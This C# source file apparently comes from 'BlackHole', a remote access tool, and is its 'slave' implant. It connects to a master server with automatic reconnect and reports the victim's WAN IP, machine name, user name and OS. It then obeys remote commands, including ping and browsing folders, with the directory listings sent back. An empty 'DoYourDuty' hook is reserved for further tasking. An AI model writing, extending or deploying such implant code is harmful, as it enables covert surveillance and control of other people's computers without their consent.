using BlackHole.Common;
using BlackHole.Common.Network.Protocol;
using NetMQ;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace BlackHole.Slave
{
    /// <summary>
    /// 
    /// </summary>
    public sealed class MasterServer
    {
        private NetMQContext m_netContext;
        private NetMQSocket m_client;
        private Poller m_poller;

        /// <summary>
        /// 
        /// </summary>
        public MasterServer(NetMQContext context, string serverAddress)
        {
            m_netContext = context;
            m_client = m_netContext.CreateDealerSocket();
            m_client.Options.Linger = TimeSpan.Zero;
            m_client.Options.ReconnectInterval = TimeSpan.FromMilliseconds(500);
            m_client.ReceiveReady += Client_ReceiveReady;

            m_poller = new Poller();
            m_poller.AddSocket(m_client);
            m_poller.PollTillCancelledNonBlocking();

            m_client.Connect(serverAddress);

            Send(new GreetTheMasterMessage()
            {
                Ip = Utility.GetWanIp(),
                MachineName = Environment.MachineName,
                UserName = Environment.UserName,
                OperatingSystem = Environment.OSVersion.VersionString
            });
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        private void Send(NetMessage message) => m_client.SendMultipartMessage(new NetMQMessage(new byte[][] { message.Serialize() }));

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void Client_ReceiveReady(object sender, NetMQSocketEventArgs e)
        {
            var frames = e.Socket.ReceiveMultipartMessage();
            var message = NetMessage.Deserialize(frames.Last.Buffer);
            message.Match()
                .With<DoYourDutyMessage>(DoYourDuty)
                .With<PingMessage>(Ping)
                .With<NavigateToFolderMessage>(NavigateToFolder);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        private void DoYourDuty(DoYourDutyMessage message)
        {
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        private void Ping(PingMessage message)
        {
            Send(new PongMessage());
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        private void NavigateToFolder(NavigateToFolderMessage message)
        {
            try
            {
                Send(FileHelper.Instance.NavigateToFolder(message.Path));
            }
            catch(Exception e)
            {
                Send(new StatusUpdateMessage()
                {
                    Operation = "Folder navigation",
                    Success = false,
                    Message = $"{e.Message}"
                });
            }
        }
    }
}
